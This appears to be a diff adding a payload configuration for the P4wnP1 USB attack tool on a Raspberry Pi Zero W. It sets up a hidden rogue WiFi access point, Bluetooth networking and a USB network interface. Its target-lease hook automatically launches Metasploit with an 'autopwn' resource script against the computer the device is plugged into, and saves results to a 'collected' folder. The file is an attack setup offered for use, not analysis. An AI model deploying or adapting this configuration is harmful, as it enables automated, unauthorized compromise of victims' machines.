@@ -1,0 +1,61 @@
+# Metasploit db_autopwn payload
+# need pi0w and mobilephone oder laptop with wlan or bluetooth 
+# for the metasploit sessions.
+
+# Setup WiFi client mode
+# ----------------------
+WIFI_CLIENT=true
+WIFI_CLIENT_SSID="ESSID-of-upstream-WLAN" # name of target network
+WIFI_CLIENT_PSK="passphrase of upstream wlan" # passphrase for target network
+
+WIFI_REG=US # WiFi regulatory domain (if not set accordingly, WiFi could be missing and client connection fail)
+
+# Setup rouge WiFi access point 
+# -----------------------------
+WIFI_ACCESSPOINT=true
+WIFI_ACCESSPOINT_NAME="P4wnP1"
+WIFI_ACCESSPOINT_PSK="MaMe82-P4wnP1"
+WIFI_ACCESSPOINT_IP="172.24.0.1" # IP used by P4wnP1
+WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
+WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100" # DHCP Server IP Range
+WIFI_ACCESSPOINT_HIDE_SSID=true # hide ESSID
+
+# Setup bluetooth
+# ---------------
+BLUETOOTH_NAP=true # enable bluetooth NAP, P4wnP1 will be rechable via BT on IP configured in setup.cfg (BLUETOOTH_NAP_IP)
+BLUETOOTH_NAP_PIN=1337 # unused, PIN authentication currently not working (custom agent for bluez 5 needed)
+BLUETOOTH_NAP_IP="172.26.0.1" # IP used by P4wnP1
+BLUETOOTH_NAP_NETMASK="255.255.255.0"
+BLUETOOTH_NAP_DHCP_RANGE="172.26.0.2,172.26.0.100" # DHCP Server IP Range
+
+# Network and DHCP options for Ethernet over USB
+# ----------------------------------------------
+
+# We choose an IP with a very small subnet (see comments in README.rst)
+IF_IP="172.16.0.1" # IP used by P4wnP1
+IF_MASK="255.255.255.252" 
+IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Range
+
+# disable setting of static routes for all IPv4 addresses
+ROUTE_SPOOF=false
+
+# Basic device setup
+# ------------------
+
+USB_VID="0x1D6B"        # Vendor ID
+USB_PID="0x0437"        # Product ID
+#USB_PID=$(printf "0x%04X" $RANDOM) # Random PID to raise chance of driver reinstall
+
+USE_ECM=false           # if true CDC ECM will be enabled
+USE_RNDIS=true          # if true RNDIS will be enabled
+USE_HID=false           # if true HID (keyboard) will be enabled
+USE_RAWHID=false        # if true HID raw device will be enabled
+USE_UMS=false           # if true USB Mass Storage will be enabled
+
+# this function gets called if the target received a DHCP lease
+# (DHCP client has to be running on target)
+function onTargetGotIP()
+{
+ sudo ruby $wdir/metasploit-framework/msfconsole -r $wdir/payloads/msf/autopwn_usb.rc >> $wdir/collected/msfAutopwnOUTPUT.txt
+}
+
